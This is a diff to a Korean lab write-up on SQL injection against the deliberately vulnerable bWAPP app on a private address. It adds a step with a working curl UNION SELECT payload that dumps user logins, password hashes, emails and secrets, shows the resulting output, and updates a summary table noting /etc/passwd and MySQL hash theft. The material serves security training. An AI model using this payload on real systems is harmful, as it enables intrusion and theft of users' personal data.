@@ -59,7 +59,11 @@
         │
         ▼
 [5단계] 시스템 파일 탈취 (LOAD_FILE)
-        (/etc/passwd, 데이터베이스 계정/해쉬 탈취)
+        (/etc/passwd, 데이터베이스 서버 계정/해쉬 탈취)
+        │
+        ▼
+[6단계] 애플리케이션 사용자 데이터베이스 탈취
+        (bWAPP DB의 users 테이블의 정보 유출)
 ```
 
 ---
@@ -153,7 +157,33 @@ sys:x:3:3:sys:/dev:/bin/sh
 
 ---
 
-### Step 5: MySQL 계정 및 비밀번호 해쉬 유출
+### Step 5: 애플리케이션 사용자 (bWAPP) 데이터베이스 유출
+
+`bWAPP.users` 테이블에서 웹 서비스에 가입된 실제 사용자의 아이디, 비밀번호 해쉬, 이메일, 비밀키 등의 중요한 개인정보를 추출할 수 있습니다. 
+
+```bash
+# bWAPP 사용자 정보 추출 (login, password hash, email, secret)
+curl -s \
+     -b /home/kali/docker_exam/bwapp_cookie.txt \
+     "http://192.168.0.20/bWAPP/sqli_1.php?title='%20UNION%20SELECT%201,login,password,email,secret,6,7%20FROM%20bWAPP.users--%20-&action=search" | grep -i -A 10 "<tr height=\"30\">" | tail -15
+```
+
+**실행 결과:**
+```html
+<tr height="30">
+    <td>test</td>
+    <td align="center">a94a8fe5ccb19ba61c4c0873d391e987982fbbd3</td>
+    <td>test</td>
+    <td align="center">test@test.com</td>
+    <td align="center"><a href="http://www.imdb.com/title/6" target="_blank">Link</a></td>
+</tr>
+```
+
+> 💡 **개인정보 유출 사고의 핵심 원인**: 이처럼 관리자 권한 없이도 웹 애플리케이션 자체의 취약점을 통해 해당 서비스에 가입된 모든 회원의 중요 정보(이메일, 비밀번호 해시 등)가 통째로 유출되는 2차 피해가 발생합니다.
+
+---
+
+### Step 6: MySQL 계정 및 비밀번호 해쉬 유출
 
 데이터베이스 루트 권한을 사용해 DBMS 자체의 다른 접속 계정과 비밀번호 해쉬도 유출할 수 있습니다.
 
@@ -178,9 +208,10 @@ curl -s \
 |-----------|------------------|
 | **데이터베이스 명** | `bWAPP` |
 | **접속 DB 계정** | `root@localhost` |
-| **DBMS 버전** | `5.0.96-0ubuntu3` } (MySQL) |
+| **DBMS 버전** | `5.0.96-0ubuntu3` (MySQL) |
 | **운영체제 파일** | `/etc/passwd` 정보 탈취 성공 |
-| **DB 해시 암호** | `debian-sys-maint` 유저의 인증 해시 |
+| **웹 서비스 사용자** | `login`, `password`, `email`, `secret` 등 `users` 테이블 전체 회원 정보 유출 |
+| **DB 해시 암호** | `debian-sys-maint` 유저 등 MySQL 시스템 인증 해시 유출 |
 
 ---
 
